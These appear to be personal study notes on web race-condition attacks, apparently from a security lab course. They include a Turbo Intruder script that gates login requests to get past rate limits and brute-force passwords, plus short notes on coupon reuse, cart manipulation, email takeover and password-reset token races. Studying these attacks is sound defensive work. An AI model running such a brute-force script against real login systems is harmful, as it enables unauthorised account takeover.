**Coupon
```
	- Repeater > custom actions > Trigger race condition
```
```Ratelimit Brute-forces Login
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)

```
**Multi endpoint race conditions
add gift to cart > ( add jacket > checkout > add jacket ) group parallel
![[Pasted image 20260611101235.png]]
Single endpoint (Take over email)
![[Pasted image 20260611102526.png]]
![[Pasted image 20260611102538.png]]

**Exploiting time-sensitive vuln
![[Pasted image 20260612094147.png]]
![[Pasted image 20260612094430.png]]
diff new cookie and csrf > new password token's hash
![[Pasted image 20260612094328.png]]
